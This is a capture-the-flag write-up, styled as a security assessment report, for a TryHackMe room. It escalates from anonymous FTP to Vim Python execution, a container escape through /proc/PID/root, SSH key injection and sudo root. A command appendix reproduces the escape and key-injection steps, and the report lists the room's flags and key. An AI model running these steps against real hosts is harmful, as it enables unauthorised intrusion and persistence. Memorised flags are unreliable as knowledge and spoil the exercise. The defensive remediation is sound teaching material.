# Security Assessment Report: Frosteau Busy with Vim

## Assessment Overview
- **Platform:** TryHackMe
- **Target:** 10.129.171.136
- **Room Type:** CTF / Container Escape / Privilege Escalation
- **Date Solved:** 2026-04-28

**Objectives & Status:**
- [x] Capture Flag 1 ( foothold / FTP )
- [x] Capture Flag 2 ( Vim environment variable )
- [x] Capture Flag 3 ( container escape )
- [x] Capture Flag 4 ( root on host )
- [x] Retrieve Yetikey 3

---

## Executive Summary & Key Findings

The target is an Ubuntu host running a Docker container (`busy_busy_box`) that exposes FTP, Vim, and Nano over non-standard telnet-style ports. The container's `/bin` and `/usr/bin` directories are empty, but Vim's embedded Python3 interpreter and access to the host's `/proc` filesystem allowed a full container escape, host filesystem access via `/proc/<pid>/root`, SSH key injection, and ultimately root privileges through a `sudo NOPASSWD: ALL` misconfiguration.

- **Exposed Services:** SSH (22), HTTP/WebSockify (80), FTP (8075), Vim (8085), Nano (8095)
- **Interesting Paths:** `/proc/<pid>/root/` (host mount namespace), `/usr/frosty/sh`, `/etc/file/busybox`
- **Credentials Discovered:** Anonymous FTP (no password required)
- **Users Enumerated:** `ubuntu` (host), `1000` (container)
- **Loot & Flags:**
  - `THM{Let.the.game.begin}`
  - `THM{Seems.like.we.are.getting.busy}`
  - `THM{Not.all.roots.and.routes.are.equal}`
  - `THM{Frosteau.would.be.both.proud.and.disappointed}`
  - **Yetikey 3:** `3-d2dc6a02db03401177f0511a6c99007e945d9cb9b96b8c6294f8c5a2c8e01f60`

---

## Exploitation Chain

1. **Reconnaissance:** `nmap -sC -sV -p- --min-rate 10000` revealed FTP on 8075 with anonymous login, Vim on 8085, and Nano on 8095.
2. **Initial Access:** Logged into FTP anonymously, downloaded `flag-1-of-4.txt` and `flag-2-of-4.sh`. Read `$FLAG2` via the remote Vim session (`:echo $FLAG2`).
3. **Container Escape:** Used Vim's `:py3` to scan `/proc` for bash processes, discovered PID 1648 (`/usr/bin/bash`) running in the host's mount namespace. Accessed host filesystem through `/proc/1648/root/`, injected an SSH public key into `/home/ubuntu/.ssh/authorized_keys`, and established a persistent SSH session as `ubuntu`.
4. **Privilege Escalation:** `sudo -l` revealed `NOPASSWD: ALL`. Used `sudo` to read `/root/flag-4-of-4.txt` and `/root/yetikey3.txt`. Used `docker cp` to extract `flag-3-of-4.txt` from the running container.

---

## Vulnerability Details

### VULN-01: Anonymous FTP Information Disclosure
- **Vulnerable Location:** Port 8075 / BusyBox ftpd
- **Overview:** The FTP server allows anonymous login (`FTP code 230`) without any authentication. Sensitive files including flags (`flag-1-of-4.txt`, `flag-2-of-4.sh`) and case files (`FROST-2247-SP.txt`, `YETI-1125-SP.txt`) were stored in the anonymous-accessible root directory.
- **Impact:** Unauthenticated attackers can enumerate and download sensitive files, gaining early intelligence and flags.
- **Severity:** High
- **Remediation:** Disable anonymous FTP or restrict anonymous users to a chrooted, empty directory. Enforce authentication for any file access.
- **References:**
  - [NVD - CVE-1999-0527](https://nvd.nist.gov/vuln/detail/CVE-1999-0527) — Anonymous FTP writable root directory
  - [CWE-200](https://cwe.mitre.org/data/definitions/200.html) — Exposure of Sensitive Information to an Unauthorized Actor
  - [CWE-276](https://cwe.mitre.org/data/definitions/276.html) — Incorrect Default Permissions
- **Proof of Impact:**
  - Successfully authenticated as `anonymous` via `ftp -n 10.129.171.136 8075`.
  - Retrieved `flag-1-of-4.txt` and `flag-2-of-4.sh` without credentials.

### VULN-02: Exposed Interactive Vim Session over Telnet
- **Vulnerable Location:** Port 8085
- **Overview:** A Vim instance is exposed directly over TCP/telnet without authentication. Vim's built-in Python3 interpreter (`:py3`) allows arbitrary code execution within the container context. This is equivalent to an unauthenticated remote shell.
- **Impact:** Complete remote code execution inside the container. Attackers can read/write files, inspect processes, and pivot to the host via `/proc`.
- **Severity:** Critical
- **Remediation:** Never expose interactive editors over the network. If remote editing is required, use authenticated SSH tunnels or VPN-protected services. Disable Vim Python/Lua/Ruby integrations in restricted environments.
- **References:**
  - [NVD - CVE-2019-20807](https://nvd.nist.gov/vuln/detail/CVE-2019-20807) — Vim Python/Lua/Ruby scripting bypass in restricted mode
  - [NVD - CVE-2019-12735](https://nvd.nist.gov/vuln/detail/CVE-2019-12735) — Vim modeline remote code execution
  - [CWE-319](https://cwe.mitre.org/data/definitions/319.html) — Cleartext Transmission of Sensitive Information
  - [CWE-306](https://cwe.mitre.org/data/definitions/306.html) — Missing Authentication for Critical Function
- **Proof of Impact:**
  - Connected via `socket.socket().connect(('10.129.171.136', 8085))`.
  - Executed `:py3 import os; print(os.getuid())` — confirmed code execution as uid 1000.
  - Executed `:py3 os.walk('/proc')` to enumerate host processes.

### VULN-03: Container Escape via /proc/PID/root Mount Namespace Leakage
- **Vulnerable Location:** Docker container configuration — shared PID namespace or unrestricted `/proc` access
- **Overview:** The container's `/proc` filesystem exposes other processes' mount namespaces via `/proc/<pid>/root/`. A host process (PID 1648, `/usr/bin/bash`) was visible from inside the container. By setting Vim's `shell` option to `/proc/1648/root/usr/bin/bash`, the attacker broke out of the container's filesystem and gained access to the host's root filesystem.
- **Impact:** Full container escape leading to host filesystem read/write access. This enables persistent access (SSH key injection), credential theft, and full system compromise.
- **Severity:** Critical
- **Remediation:**
  - Run containers with `--pid=host` only when absolutely necessary; prefer isolated PID namespaces.
  - Apply seccomp profiles and AppArmor/SELinux policies that restrict `/proc` traversal.
  - Drop unnecessary capabilities (`CAP_SYS_PTRACE`, `CAP_SYS_ADMIN`).
  - Upgrade runc/Docker to patched versions.
- **References:**
  - [NVD - CVE-2024-21626](https://nvd.nist.gov/vuln/detail/CVE-2024-21626) — runc container escape via procfs file descriptors (Leaky Vessels)
  - [NVD - CVE-2025-52881](https://nvd.nist.gov/vuln/detail/CVE-2025-52881) — runc container escape via procfs write redirects
  - [CWE-1008](https://cwe.mitre.org/data/definitions/1008.html) — Architectural Concepts
  - [Reversec Labs — Abusing /proc/pid/root](https://labs.reversec.com/posts/2020/06/abusing-access-to-mount-namespaces-through-procpidroot)
- **Proof of Impact:**
  - `:py3 import os; print(os.readlink('/proc/1648/exe'))` → `/usr/bin/bash`
  - `:set shell=/proc/1648/root/usr/bin/bash` followed by `:!id` → `uid=1000(ubuntu) gid=1000(ubuntu)`
  - Injected SSH key into `/proc/1648/root/home/ubuntu/.ssh/authorized_keys`
  - Established direct SSH session to host as `ubuntu`

### VULN-04: Sudo NOPASSWD: ALL Privilege Escalation
- **Vulnerable Location:** Host `/etc/sudoers`
- **Overview:** The `ubuntu` user is configured with `(ALL) NOPASSWD: ALL`, allowing any command to be executed as root without password authentication. Once the attacker gained access as `ubuntu` (via the container escape + SSH key injection), root access was trivial.
- **Impact:** Complete host compromise. Root-level access to all files, processes, and system commands.
- **Severity:** Critical
- **Remediation:**
  - Remove `NOPASSWD` where feasible; enforce password re-authentication.
  - Restrict sudoers to specific commands and explicit paths (least privilege).
  - Use `Defaults timestamp_timeout=0` to require passwords for every sudo invocation.
  - Audit `/etc/sudoers` and `/etc/sudoers.d/` regularly.
- **References:**
  - [NVD - CVE-2020-24848](https://nvd.nist.gov/vuln/detail/CVE-2020-24848) — FruityWifi sudoers unsafe configuration `(ALL : ALL) NOPASSWD: ALL`
  - [CWE-269](https://cwe.mitre.org/data/definitions/269.html) — Improper Privilege Management
  - [CWE-287](https://cwe.mitre.org/data/definitions/287.html) — Improper Authentication
- **Proof of Impact:**
  - SSH'd in as `ubuntu`, ran `sudo -l` → `User ubuntu may run the following commands on tryhackme: (ALL) NOPASSWD: ALL`
  - `sudo cat /root/flag-4-of-4.txt` → `THM{Frosteau.would.be.both.proud.and.disappointed}`
  - `sudo cat /root/yetikey3.txt` → `3-d2dc6a02db03401177f0511a6c99007e945d9cb9b96b8c6294f8c5a2c8e01f60`

---

## Senior-Level Lessons Learned & Analysis

### Strategic Takeaways
- **Container isolation is not a security boundary by default.** Docker's default settings do not prevent `/proc` namespace leakage. If an attacker gains code execution inside a container, assume host compromise is possible unless proven otherwise.
- **Exposed interactive services are remote shells.** A Vim session over TCP is functionally identical to an unauthenticated root shell when Vim has Python3 support. Treat any exposed editor, REPL, or debug console as a critical vulnerability.
- **Anonymous FTP is anachronistic and dangerous.** Even when read-only, anonymous FTP provides unauthenticated access to filesystem contents. Modern architectures should use authenticated SFTP/SCP or object storage with IAM policies.
- **`NOPASSWD: ALL` is not a convenience — it is a backdoor.** In any environment where an unprivileged user can run `sudo` without a password, privilege escalation becomes a single command. This is especially dangerous when combined with container escapes or weak service authentication.

### Real-World Context & Defense
- **Threat Landscape:** Container escapes are increasingly common in cloud-native environments. Misconfigured Docker deployments (shared PID namespaces, privileged containers, mounted Docker sockets) are frequent targets in red-team assessments and real-world breaches.
- **Detection Engineering:**
  - Monitor for unusual `/proc/<pid>/root/` access patterns inside containers.
  - Alert on `sudo` executions by non-admin users, especially `sudo -l` followed by rapid privilege escalation.
  - Log FTP anonymous logins and file downloads.
  - Detect SSH key modifications in `~/.ssh/authorized_keys` outside of standard provisioning pipelines.
- **System Hardening:**
  - Follow CIS Docker Benchmark v1.6.0: disable `--pid=host`, drop `CAP_SYS_PTRACE`, enable user namespaces.
  - Use NIST SP 800-190 (Application Container Security Guide) for container deployment baselines.
  - Enforce AppArmor/SELinux profiles that deny `/proc` traversal from within containers.
  - Replace anonymous FTP with authenticated SFTP and enforce chroot jails.

---

## Technical Appendix: Commands Worth Keeping

```bash
# Recon
nmap -sC -sV -p- --min-rate 10000 --max-retries 1 --host-timeout 5m 10.129.171.136

# FTP anonymous access
echo -e "user anonymous anonymous\npassive\nls\nget flag-1-of-4.txt -\nbye" | ftp -n -p 10.129.171.136 8075

# Vim session — read env var
python3 -c "
import socket, time
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.129.171.136', 8085))
time.sleep(1)
s.settimeout(2)
try:
    while True: s.recv(4096)
except: pass
s.send(b':echo \$FLAG2\n')
time.sleep(1)
result = b''
try:
    while True:
        data = s.recv(4096)
        if not data: break
        result += data
except: pass
s.close()
print(result.decode('latin-1', errors='replace'))
"

# Vim py3 — scan /proc for host bash processes
:py3 import os; [print(pid, os.readlink(f"/proc/{pid}/exe")) for pid in [d for d in os.listdir("/proc") if d.isdigit()] if os.path.islink(f"/proc/{pid}/exe") and ("bash" in os.readlink(f"/proc/{pid}/exe") or "sh" in os.readlink(f"/proc/{pid}/exe"))]

# Vim — set shell to host binary
:set shell=/proc/1648/root/usr/bin/bash

# Inject SSH key via Vim shell
:!echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOGNkQj5S5AgnYY/Eck560gtigwIR8wEMH5+HpuZ2WQp ctf" >> /proc/1648/root/home/ubuntu/.ssh/authorized_keys

# SSH in and escalate
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i ~/.ssh/id_ed25519 ubuntu@10.129.171.136
sudo -l
sudo cat /root/flag-4-of-4.txt

# Extract flag 3 from container
docker cp containers_busy_1:/root/flag-3-of-4.txt /tmp/flag3.txt
cat /tmp/flag3.txt
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Service discovery and version enumeration |
| `ftp` | Anonymous FTP file retrieval |
| `python3` + `socket` | Raw TCP interaction with Vim/Nano sessions |
| Vim `:py3` | In-container code execution and `/proc` enumeration |
| `ssh` / `ssh-keygen` | Key generation and persistent host access |
| `docker` (host) | Container introspection (`docker ps`, `docker cp`) |
| `sudo` | Host privilege escalation |
